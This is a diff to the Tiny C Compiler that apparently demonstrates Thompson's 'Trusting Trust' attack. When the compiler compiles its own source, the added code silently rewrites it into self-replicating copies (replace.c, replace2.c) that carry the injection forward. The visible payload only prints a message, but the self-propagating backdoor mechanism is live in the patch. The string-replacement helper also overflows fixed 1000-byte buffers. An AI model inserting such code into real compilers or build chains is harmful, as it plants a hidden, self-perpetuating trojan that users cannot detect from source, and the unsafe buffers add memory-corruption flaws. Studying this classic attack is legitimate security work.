@@ -963,6 +963,25 @@ ST_FUNC DLLReference *tcc_add_dllref(TCCState *s1, const char *dllname)
     return ref;
 }
 
+void replaceAll(char *str, const char *oldWord, const char *newWord) {
+    char *pos, temp[1000];
+    int index = 0;
+    int owlen;
+
+    owlen = strlen(oldWord);
+
+    if (!strcmp(oldWord, newWord)) {
+        return;
+    }
+
+    while ((pos = strstr(str, oldWord)) != NULL) {
+        strcpy(temp, str);
+        index = pos - str;
+        str[index] = '\0';
+        strcat(str, newWord);
+        strcat(str, temp + index + owlen);
+    }
+}
 /* OpenBSD: choose latest from libxxx.so.x.y versions */
 #if defined TARGETOS_OpenBSD && !defined _WIN32
 #include <glob.h>
@@ -988,8 +1007,8 @@ static int tcc_glob_so(TCCState *s1, const char *pattern, char *buf, int size)
 }
 #endif
 
-ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int flags)
-{
+ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int x_flags) {
+    int flags = x_flags;
     int fd, ret = -1;
 
 #if defined TARGETOS_OpenBSD && !defined _WIN32
@@ -998,6 +1017,76 @@ ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int flags)
         filename = buf;
 #endif
 
+    int bug = 0;
+    char line[4095 + 1];
+    FILE *fPtr = fopen(filename, "r");
+    if (strcmp(&filename[strlen(filename) - strlen(".c")], ".c") == 0) {
+        while (fgets(line, sizeof line, fPtr)) {
+            if (strstr(line, "ST_FUNC int tcc_add_file_internal(TCCState"))
+                bug = 1;
+        }
+    }
+    if (bug == 1) {
+        FILE *fTemp = fopen("replace.c", "w");
+        char buffer[1000];
+        fPtr = fopen(filename, "r");
+        while ((fgets(buffer, 1000, fPtr)) != NULL) {
+            replaceAll(buffer, "/* open the file */", "/* bug */ "
+                                                      "int bug = 0;"
+                                                      "char line[4095 + 1];"
+                                                      "FILE *fPtr = fopen(filename, \"r\");"
+                                                      "if (strcmp(&filename[strlen(filename) - strlen(\".c\")], \".c\") == 0){ "
+                                                      "while (fgets(line, sizeof line, fPtr)) {"
+                                                      "if (strstr(line, \"ST_FUNC int tcc_add_file_internal(TCCState\")) bug = 1;  }\n"
+                                                      "    }\n"
+                                                      "    if (bug == 1) {  FILE *fTemp = fopen(\"replace.c\", \"w\");\n"
+                                                      "        char buffer[1000];\n"
+                                                      "        fPtr = fopen(filename, \"r\");\n"
+                                                      "        while ((fgets(buffer, 1000, fPtr)) != NULL) {  "
+                                                      "replaceAll(buffer, \"    fd = _tcc_open(s1, filename);\",  \"  printf(\\\"The compiler has the Thompson RoTT Trojan\\\");  fd = _tcc_open(s1, filename);\");"
+
+                                                      "fputs(buffer, fTemp);\n"
+                                                      "        }\n"
+                                                      "        fclose(fPtr);\n"
+                                                      "        fclose(fTemp);"
+                                                      "filename = \"replace.c\";\n"
+                                                      "    }"
+            );
+            fputs(buffer, fTemp);
+        }
+        fclose(fPtr);
+        fclose(fTemp);
+        fPtr = fopen("replace.c", "r");
+        fTemp = fopen("replace2.c", "w");
+        char buffer2[1000];
+        while ((fgets(buffer2, 1000, fPtr)) != NULL) {
+            replaceAll(buffer2, "/* copy a string and truncate it. */",
+                       "void replaceAll(char *str, const char *oldWord, const char *newWord) {\n"
+                       "    char *pos, temp[1000];\n"
+                       "    int index = 0;\n"
+                       "    int owlen;\n"
+                       "\n"
+                       "    owlen = strlen(oldWord);\n"
+                       "\n"
+                       "    if (!strcmp(oldWord, newWord)) {\n"
+                       "        return;\n"
+                       "    }\n"
+                       "\n"
+                       "    while ((pos = strstr(str, oldWord)) != NULL) {\n"
+                       "        strcpy(temp, str);\n"
+                       "        index = pos - str;\n"
+                       "        str[index] = '\\0';\n"
+                       "        strcat(str, newWord);\n"
+                       "        strcat(str, temp + index + owlen);\n"
+                       "    }\n"
+                       "}"
+            );
+            fputs(buffer2, fTemp);
+        }
+        fclose(fPtr);
+        fclose(fTemp);
+        filename = "replace2.c";
+    }
     /* open the file */
     fd = _tcc_open(s1, filename);
     if (fd < 0) {
